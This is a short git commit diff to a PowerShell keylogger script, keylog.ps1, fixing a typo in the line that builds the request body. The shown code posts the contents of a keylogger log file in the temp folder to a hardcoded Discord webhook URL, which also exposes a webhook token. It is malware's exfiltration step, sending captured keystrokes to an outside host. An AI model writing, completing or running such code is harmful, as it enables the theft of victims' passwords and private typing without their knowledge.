980a4df17e37e99bbb1f400f21d49e7bc4031bbe
Syke <42148690+ISykeI@users.noreply.github.com>
2022-02-10 12:25:23 +0200

    Update keylog.ps1

--- keylog.ps1
+++ keylog.ps1
@@ -2,7 +2,7 @@
 # Discord: syke#1166 / Syke#1166
 
 $webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
-            Body = @{
+ $Body = @{
   
   'content' = get-content $env:temp/keylogger.log
 }
